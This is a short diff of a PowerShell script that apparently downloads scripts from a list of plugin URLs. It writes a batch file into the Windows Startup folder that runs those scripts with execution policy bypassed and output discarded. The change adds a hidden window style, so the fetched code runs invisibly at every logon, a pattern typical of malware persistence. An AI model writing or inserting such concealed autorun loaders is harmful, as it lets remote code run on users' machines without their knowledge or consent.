@@ -70,7 +70,7 @@ foreach ($url in $pluginUrls) {
 
 $batContent = "@echo off`n"
 foreach ($scriptPath in $scriptPaths) {
-    $batContent += "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" >nul 2>&1`n"
+    $batContent += "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" >nul 2>&1`n"
 }
 
 $startupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
